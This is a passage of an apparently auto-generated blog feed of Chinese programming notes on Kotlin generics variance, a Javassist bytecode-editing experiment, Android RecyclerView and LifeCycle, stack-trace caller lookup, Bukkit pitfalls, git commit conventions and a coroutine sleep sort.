operator">:</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token comment">// 声明泛型时在前面加个out即可规定这个类在这个泛型上是协变的</span><span class="token keyword">class</span> Data<span class="token operator">&lt;</span><span class="token keyword">out</span> T<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 不合法，因为外部可以访问并修改这个变量</span>    <span class="token comment">// 编译不通过</span>    <span class="token keyword">var</span> value<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 合法，外部无法访问这个变量</span>    <span class="token keyword">private</span> <span class="token keyword">var</span> value2<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 合法，因为这是常量，常量值无法被修改</span>    <span class="token keyword">val</span> value3<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 不合法，因为协变规定了不能在方法参数中使用泛型</span>    <span class="token comment">// 编译不通过</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span>input<span class="token operator">:</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// 这样做是合法的，方法的返回值可以使用泛型</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> T <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> List<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">test</span><span class="token punctuation">(</span>people<span class="token operator">:</span> Data<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> studentList <span class="token operator">=</span> <span class="token function">arrayListOf</span><span class="token punctuation">(</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token punctuation">)</span>    <span class="token keyword">val</span> <span class="token keyword">data</span> <span class="token operator">=</span> <span class="token function">Data</span><span class="token punctuation">(</span><span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"xxx"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token function">test</span><span class="token punctuation">(</span><span class="token keyword">data</span><span class="token punctuation">)</span> <span class="token comment">// 使用协变后 编译通过</span>    <span class="token function">test</span><span class="token punctuation">(</span>studentList<span class="token punctuation">)</span> <span class="token comment">// 编译可以通过</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="逆变"><a href="#逆变" class="headerlink" title="逆变"></a>逆变</h2><p>协变让我们可以将Data&lt;Student&gt;隐式向上转型变成Data&lt;Person&gt;</p><p>那么逆变自然是让我们可以向下转型，并且它是隐式的</p><p>只要我们约定泛型不会在返回值中使用，就可以让持有泛型的类<strong>隐式的</strong>向下转型 (隐式的向上转型意味着这可能不会像协变那样安全)</p><h3 id="使用示例"><a href="#使用示例" class="headerlink" title="使用示例"></a>使用示例</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">open</span> <span class="token keyword">class</span> <span class="token function">Person</span><span class="token punctuation">(</span><span class="token keyword">val</span> name<span class="token operator">:</span> String<span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token function">Student</span><span class="token punctuation">(</span>name<span class="token operator">:</span> String<span class="token punctuation">,</span> <span class="token keyword">val</span> level<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token function">Person</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token keyword">interface</span> Transformer<span class="token operator">&lt;</span><span class="token keyword">in</span> T<span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">fun</span> <span class="token function">transform</span><span class="token punctuation">(</span>t<span class="token operator">:</span> T<span class="token punctuation">)</span><span class="token operator">:</span> String<span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> trans <span class="token operator">=</span> <span class="token keyword">object</span> <span class="token operator">:</span> Transformer<span class="token operator">&lt;</span>Person<span class="token operator">&gt;</span> <span class="token punctuation">{</span>        <span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">transform</span><span class="token punctuation">(</span>t<span class="token operator">:</span> Person<span class="token punctuation">)</span><span class="token operator">:</span> String <span class="token punctuation">{</span>            <span class="token keyword">return</span> t<span class="token punctuation">.</span>name        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token function">handleTransformer</span><span class="token punctuation">(</span>trans<span class="token punctuation">)</span> <span class="token comment">// 如果不声明逆变 这行代码无法通过编译</span><span class="token punctuation">}</span><span class="token keyword">fun</span> <span class="token function">handleTransformer</span><span class="token punctuation">(</span>trans<span class="token operator">:</span> Transformer<span class="token operator">&lt;</span>Student<span class="token operator">&gt;</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> student <span class="token operator">=</span> <span class="token function">Student</span><span class="token punctuation">(</span><span class="token string">"Tom"</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> result <span class="token operator">=</span> trans<span class="token punctuation">.</span><span class="token function">transform</span><span class="token punctuation">(</span>student<span class="token punctuation">)</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="UnsafeVariance注解"><a href="#UnsafeVariance注解" class="headerlink" title="@UnsafeVariance注解"></a>@UnsafeVariance注解</h2><p>在你违反了协变/逆变的约定时，可以使用这个注解让编译通过</p><p>但正如它的字面意思，<strong>它不安全</strong></p><p>在迫不得已要使用它的情况下，你必须清楚你在做什么</p><h3 id="使用示例-1"><a href="#使用示例-1" class="headerlink" title="使用示例"></a>使用示例</h3><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">class</span> Data<span class="token operator">&lt;</span><span class="token keyword">out</span> T<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token keyword">val</span> <span class="token keyword">data</span><span class="token operator">:</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 不合法，因为外部可以访问并修改这个变量</span>    <span class="token comment">// 使用@UnsafeVariance注解，编译通过</span>    <span class="token keyword">var</span> value<span class="token operator">:</span> <span class="token annotation builtin">@UnsafeVariance</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 合法，外部无法访问这个变量</span>    <span class="token keyword">private</span> <span class="token keyword">var</span> value2<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 合法，因为这是常量，常量值无法被修改</span>    <span class="token keyword">val</span> value3<span class="token operator">:</span> T <span class="token operator">=</span> <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment">// 不合法，因为协变规定了不能在方法参数中使用泛型</span>    <span class="token comment">// 使用@UnsafeVariance注解，编译通过</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span>input<span class="token operator">:</span> <span class="token annotation builtin">@UnsafeVariance</span> T<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// 这样做是合法的，方法的返回值可以使用泛型</span>    <span class="token keyword">fun</span> <span class="token function">func</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">:</span> T <span class="token punctuation">{</span>        <span class="token function">TODO</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></b>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hello World！</title>
      <link href="/2021/11/08/hello-world/"/>
      <url>/2021/11/08/hello-world/</url>
      
        <content type="html"><![CDATA[<h1 id="Hello-World"><a href="#Hello-World" class="headerlink" title="Hello World"></a>Hello World</h1><blockquote><p>于是万物伊始</p></blockquote><p>记于 2021/11/9 ，博客由gitblog迁移到hexo，完毕。</p><p>之后会陆陆续续上传以前的博文，然后彻底关停之前的博客。</p><h1 id="Self-Introduction"><a href="#Self-Introduction" class="headerlink" title="Self Introduction"></a>Self Introduction</h1><blockquote><ul><li>就读于CQUPT的一位普通带学生</li><li>Bukkit插件开发者，同时也是一位半弃坑的MC服务器服主</li><li>常用开发语言是Kotlin，自从用了Kotlin就回不去Java了</li><li>目前是红岩网校移动开发部安卓方向/Web研发部前端方向的一名学员 （主要发展方向是安卓开发）</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>初试Javassist</title>
      <link href="/2021/11/07/try-javassist/"/>
      <url>/2021/11/07/try-javassist/</url>
      
        <content type="html"><![CDATA[<p>今天看见群友做了个很有意思的东西: 拦截插件的setOp方法，彻底干掉后门插件</p><p>经过一番交谈之后，我得知这是利用Javassist做的，利用javassist将setop方法的内容替换便可实现。之前也在b站看到过有大佬用javassist利用Integer装箱的特性整病毒注入的骚操作…于是我surf the internet，了解了一下这个库的用法，发现它与asm库的作用不是一般的相似。但它不同于asm库的是它的可操作空间是没有asm库大的，但它的操作会简单许多。我们甚至不需要了解字节码便能使用javassist实现一些修改字节码的功能。</p><p>实验代码</p><pre class="line-numbers language-none"><code class="language-none">fun main() {    javassistEdit()}fun javassistEdit() {    // 获取ctClass,因为是Kotlin文件所以带有Kt后缀    val ctClass = ClassPool.getDefault().get("kim.bifrost.coldrain.partice.TestClass")    // 从ctClass获取方法    val ctMethod = ctClass.getDeclaredMethod("test")    // 直接修改方法体    ctMethod.setBody("{ System.out.println(\"修改过后的内容\"); }")    // 在方法起始行插入代码    ctMethod.insertBefore("""        System.out.println("第一行");        """)    // 在方法最后一行插入代码    ctMethod.insertAfter("""        System.out.println("最后一行");        """)    // 通过cflow检查是否为递归调用    ctMethod.useCflow("test")    // 若不为递归调用则打印test    ctMethod.insertBefore("if ($"+ "cflow(test) == 0)" +            " System.out.println(\"test \");")    // 将newInstance获得的实例直接cast成接口,避免反射带来的开销    (ctClass.toClass().newInstance() as TestInterface).test()}class TestClass : TestInterface {    override fun test() {        println("测试内容1")    }}interface TestInterface {    fun test()}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>输出结果:</p><pre class="line-numbers language-none"><code class="language-none">test 第一行修改过后的内容最后一行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>但我有些疑惑的地方在于，要怎么样才直接修改TestClass本身，让修改以后调用这个类本身的方法也是经过我们修改的方法</p><p>而不是用我们修改过的ctClass实例化出一个实例来调用其中的方法</p><p>毕竟，只有这样才能做到那位群友的 “把setOp方法删干净” 的效果呢</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
            <tag> 外部库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记观察者模式(Observer Pattern) &amp; Android LifeCycle</title>
      <link href="/2021/11/06/observe-pattern-and-android/"/>
      <url>/2021/11/06/observe-pattern-and-android/</url>
      
        <content type="html"><![CDATA[<p>其实今天我才听说这种设计模式（之前把这个跟visitor模式搞混了），但以前不知不觉已经用过很多这样设计的api了。</p><p>上周的红岩作业甚至手搓了个eventbus（不过没搓成注解那种形式，不过确实无意中用到了观察者模式的设计方式）</p><p>感觉最牛逼的是，我是自己悟出观察者模式的设计方式去实现了eventbus，思路与观察者模式别无二致。（突然感觉自己也许没那么废物）</p><p>今天这篇博文主要是记录一下Android Jetpack组件LifeCycle的用法捏</p><h2 id="LifeCycle"><a href="#LifeCycle" class="headerlink" title="LifeCycle"></a>LifeCycle</h2><p>与TabooLib里的Awake注解比较类似，让我们不用把每个组件生命周期需要执行的代码都写在MainActivity （</p><p>有助于降低代码耦合度</p><p>同时它也使用了观察者模式的设计模式XD</p><p>草，不想写了，就这样吧</p>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Android </tag>
            
            <tag> 设计模式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java/kotlin 方法中获得调用方的类与方法名</title>
      <link href="/2021/11/03/get-stacktrace-method-path/"/>
      <url>/2021/11/03/get-stacktrace-method-path/</url>
      
        <content type="html"><![CDATA[<p>这也是我一直很感兴趣的一个问题。曾经在翻阅TabooLib5源码时发现过类似的功能，TabooLib5利用它来得到调用方法的插件实例。</p><p>今天在网上冲浪的时候搞明白了，便来写一篇博文。</p><h2 id="从栈中获取"><a href="#从栈中获取" class="headerlink" title="从栈中获取"></a>从栈中获取</h2><p>在方法调用中new一个Throwable实例，得到它的stackTrace（stackTraceElement数组），便可以提取出一条完整的方法调用链。</p><p>同理，在try catch抓报错的时候，抓到的报错也可以通过获取stackTrace来提取一条方法调用链。</p><p>在写一个Exception的时候，你甚至可以重写它的printStackTrace方法让它的报错更好看 （</p><p><strong>例子</strong></p><p>Parctice.kt</p><pre class="line-numbers language-none"><code class="language-none">package kim.bifrost.coldrain.partice/** * kim.bifrost.coldrain.partice.Partice * Partice * * @author 寒雨 * @since 2021/11/3 16:45 **/fun main() {    test()}fun test() {    // 获取上一级调用者    val info = Throwable().stackTrace.run {        get(size - 2)    }    println("class: ${info.className} method: ${info.methodName}")}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>编译后运行结果为</p><pre class="line-numbers language-none"><code class="language-none">class: kim.bifrost.coldrain.partice.ParticeKt method: main<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="获取其他线程的栈"><a href="#获取其他线程的栈" class="headerlink" title="获取其他线程的栈"></a>获取其他线程的栈</h3><p>调用Thread#getStackTrace()</p><p>该方法不建议在当前线程调用，Throwable#getStackTrace()优于该方法</p><p>理由见Log4j注释<a href="https://github.com/apache/logging-log4j2/blob/20f9a97dbe5928c3b5077bcdd2a22ac92e941655/log4j-api/src/main/java/org/apache/logging/log4j/util/StackLocator.java">https://github.com/apache/loggin … l/StackLocator.java</a></p><h2 id="JDK8后弃用的Reflection-getCallerClass方法"><a href="#JDK8后弃用的Reflection-getCallerClass方法" class="headerlink" title="JDK8后弃用的Reflection.getCallerClass方法"></a>JDK8后弃用的Reflection.getCallerClass方法</h2><p>sun.reflect.Reflection.getCallerClass()</p><p>但不建议使用，JDK8以后该内部api已经被删除</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>整理一下今天踩的坑</title>
      <link href="/2021/10/31/some-tips/"/>
      <url>/2021/10/31/some-tips/</url>
      
        <content type="html"><![CDATA[<h2 id="其一"><a href="#其一" class="headerlink" title="其一"></a>其一</h2><p>今天尝试用Kotlin委托将一个玩家Inventory的所有方法全部委托给了我写的一个CookingInventory类</p><p><a href="https://camo.githubusercontent.com/55bf43db7aba95bd5ace9c7366cc2ec8e23b8ef3933ecffb5b51287fab56b7c4/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f636f6465312e706e67"><img src="https://camo.githubusercontent.com/55bf43db7aba95bd5ace9c7366cc2ec8e23b8ef3933ecffb5b51287fab56b7c4/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f636f6465312e706e67" alt="code1"></a></p><p>然后我尝试用玩家的openInventory打开一个CookingInventory实例，发现报了这样一个错</p><p><a href="https://camo.githubusercontent.com/7f2c69bf1260d9b8abac702d8bc11bd43a88ffcb60667faceb3e1eb57c7b6215/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67312e706e67"><img src="https://camo.githubusercontent.com/7f2c69bf1260d9b8abac702d8bc11bd43a88ffcb60667faceb3e1eb57c7b6215/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67312e706e67" alt="log1"></a></p><p>原来openInventory方法的实现是对CraftInventory类型实例的操作，而不是对一个Inventory实例的操作，也就是说，我需要传入openInventory方法的参数不止应该实现Inventory接口，还应该是一个CraftInventory类型的实例</p><p>所以用委托来实现Inventory接口的类实例化得到的实例自然是没办法用这个方法open的</p><h2 id="其二"><a href="#其二" class="headerlink" title="其二"></a>其二</h2><p>今天尝试在协程中打开玩家UI界面，却发现报了个非常熟悉的错</p><p><a href="https://camo.githubusercontent.com/726d3f1aca9a78f563c95d2ded12860d7e39c4cf5483ec591ca82bce2d514a11/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67322e706e67"><img src="https://camo.githubusercontent.com/726d3f1aca9a78f563c95d2ded12860d7e39c4cf5483ec591ca82bce2d514a11/68747470733a2f2f67697465652e636f6d2f636f6c647261696e2d6d6f726f2f696d616765735f6265642f7261772f6d61737465722f696d616765732f6c6f67322e706e67" alt="log2"></a></p><p>但协程不是同步的吗？我才学了协程是并发，而并非并行。难道同一线程上的并发操作也能被称之为异步吗？</p><p>之后我发现，我调用协程方法时，无论我是不是async，他们都是在另外一条线程上执行的，而并非在Bukkit的主线程上执行。</p><p>github上有一个很有意思的库 - MCCoroutine，能让MC插件开发的大部分操作都能在协程上执行，而且实现原理据说蛮简单，下次试试能不能抄过来。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Coroutine </tag>
            
            <tag> Bukkit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Git Commit 规范</title>
      <link href="/2021/10/28/git-commit-rule/"/>
      <url>/2021/10/28/git-commit-rule/</url>
      
        <content type="html"><![CDATA[<h1 id="Commit-规范"><a href="#Commit-规范" class="headerlink" title="Commit 规范"></a>Commit 规范</h1><p>copy的学长的git教程。</p><p>以前都没怎么注意commit这方面的规范，以后要多加注意</p><blockquote><p>描述写法如下：</p><pre class="line-numbers language-none"><code class="language-none">[type]titledescribtion<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>type如下：</p><ul><li>fix ————-&gt; bug 修护</li><li>feature ——-&gt; 需求</li><li>optimize ——&gt; 优化</li><li>release ——–&gt; 版本升级</li><li>style ————&gt; 代码格式调整，不涉及代码更改</li></ul><p>title：需求标题（对于该commit的简单描述）</p><p>describtion：需求的具体描述（如果过于简单的提交可以不用写该部分）</p><p>若提交消息有说明遗漏，可以通过 [Amend](#Amend 按钮) 进行补救</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android开发笔记其一</title>
      <link href="/2021/10/24/android-note-1/"/>
      <url>/2021/10/24/android-note-1/</url>
      
        <content type="html"><![CDATA[<h1 id="Android开发笔记其一"><a href="#Android开发笔记其一" class="headerlink" title="Android开发笔记其一"></a>Android开发笔记其一</h1><h1 id="RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题"><a href="#RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题" class="headerlink" title="RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题"></a>RecyclerView的onItemClick回调函数在onBindViewHolder中调用会导致性能问题</h1><p><strong>反例</strong></p><p>会导致不断的创建匿名类，从而导致大量的性能浪费</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token keyword">private</span> <span class="token keyword">var</span> itemClickListener<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span><span class="token keyword">override</span> <span class="token keyword">fun</span> <span class="token function">onBindViewHolder</span><span class="token punctuation">(</span>holder<span class="token operator">:</span> ViewHolder<span class="token punctuation">,</span> position<span class="token operator">:</span> Int<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">val</span> fruit <span class="token operator">=</span> <span class="token keyword">data</span><span class="token punctuation">[</span>position<span class="token punctuation">]</span>     holder<span class="token punctuation">.</span>fruitImage<span class="token punctuation">.</span><span class="token function">setImageResource</span><span class="token punctuation">(</span>fruit<span class="token punctuation">.</span>image<span class="token punctuation">)</span>     holder<span class="token punctuation">.</span>fruitName<span class="token punctuation">.</span>text <span class="token operator">=</span> fruit<span class="token punctuation">.</span>name     holder<span class="token punctuation">.</span>itemView<span class="token punctuation">.</span><span class="token function">setOnClickListener</span> <span class="token punctuation">{</span>         <span class="token function">itemClickListener</span><span class="token punctuation">(</span>position<span class="token punctuation">)</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span> <span class="token comment">/**  * 回调传参  */</span> <span class="token keyword">fun</span> <span class="token function">onItemClick</span><span class="token punctuation">(</span>func<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit<span class="token punctuation">)</span> <span class="token punctuation">{</span>     itemClickListener <span class="token operator">=</span> func <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>正确的做法</strong></p><p>将回调函数在ViewHolder中调用</p><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"> <span class="token keyword">private</span> <span class="token keyword">var</span> itemClickListener<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token punctuation">}</span> <span class="token keyword">inner</span> <span class="token keyword">class</span> <span class="token function">ViewHolder</span><span class="token punctuation">(</span>view<span class="token operator">:</span> View<span class="token punctuation">)</span> <span class="token operator">:</span> RecyclerView<span class="token punctuation">.</span><span class="token function">ViewHolder</span><span class="token punctuation">(</span>view<span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">init</span> <span class="token punctuation">{</span>         view<span class="token punctuation">.</span><span class="token function">setOnClickListener</span> <span class="token punctuation">{</span>             <span class="token function">itemClickListener</span><span class="token punctuation">(</span>bindingAdapterPosition<span class="token punctuation">)</span>         <span class="token punctuation">}</span>     <span class="token punctuation">}</span>     <span class="token keyword">val</span> fruitImage<span class="token operator">:</span> ImageView <span class="token operator">=</span> view<span class="token punctuation">.</span>fruitImage     <span class="token keyword">val</span> fruitName<span class="token operator">:</span> TextView <span class="token operator">=</span> view<span class="token punctuation">.</span>fruitName <span class="token punctuation">}</span> <span class="token comment">/**  * 回调传参  */</span> <span class="token keyword">fun</span> <span class="token function">onItemClick</span><span class="token punctuation">(</span>func<span class="token operator">:</span> <span class="token punctuation">(</span>Int<span class="token punctuation">)</span> <span class="token operator">-&gt;</span> Unit<span class="token punctuation">)</span> <span class="token punctuation">{</span>     itemClickListener <span class="token operator">=</span> func <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>用kotlin协程实现了睡眠排序</title>
      <link href="/2021/10/18/kotlin-sleep-sort/"/>
      <url>/2021/10/18/kotlin-sleep-sort/</url>
      
        <content type="html"><![CDATA[<h1 id="用kotlin协程实现了睡眠排序"><a href="#用kotlin协程实现了睡眠排序" class="headerlink" title="用kotlin协程实现了睡眠排序"></a>用kotlin协程实现了睡眠排序</h1><pre class="line-numbers language-kotlin" data-language="kotlin"><code class="language-kotlin"><span class="token comment">// 睡眠排序 kotlin实现</span><span class="token comment">// 需要用到协程库</span><span class="token comment">// kt用多线程写多没意思</span><span class="token keyword">fun</span> <span class="token function">sleepSort</span><span class="token punctuation">(</span>array<span class="token operator">:</span> Array<span class="token operator">&lt;</span>Int<span class="token operator">?</span><span class="token operator">&gt;</span><span class="token punctuation">)</span><span class="token operator">:</span> List<span class="token operator">&lt;</span>Int<span class="token operator">?</span><span class="token operator">&gt;</span> <span class="token punctuation">{</span>    <span class="token keyword">val</span> result <span class="token operator">=</span> arrayListOf<span class="token operator">&lt;</span>Int<span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">val</span> list <span class="token operator">=</span> arrayListOf<span class="token operator">&lt;</span>Deferred<span class="token operator">&lt;</span>Unit<span class="token operator">&gt;</span><span class="token operator">&gt;</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>i <span class="token keyword">in</span> array<span class="token punctuation">)</span> <span class="token punctuation">{</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>GlobalScope<span class="token punctuation">.</span><span class="token function">async</span> <span class="token punctuation">{</span>            <span class="token function">delay</span><span class="token punctuation">(</span>i<span class="token operator">!!</span> <span class="token operator">*</span> <span class="token number">10L</span><span class="token punctuation">)</span>            result<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>            Unit        <span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span>    <span class="token comment">// 堵塞至操作完成</span>    runBlocking <span class="token punctuation">{</span>        list<span class="token punctuation">.</span><span class="token function">forEach</span> <span class="token punctuation">{</span>            it<span class="token punctuation">.</span><span class="token function">await</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 杂谈 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kotlin </tag>
            
            <tag> Coroutine </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>格 局 打 开</title>
      <link href="/2021/10/17/mind-opening/"/>
      <url>/2021/10/17/mind-opening/</url>
      
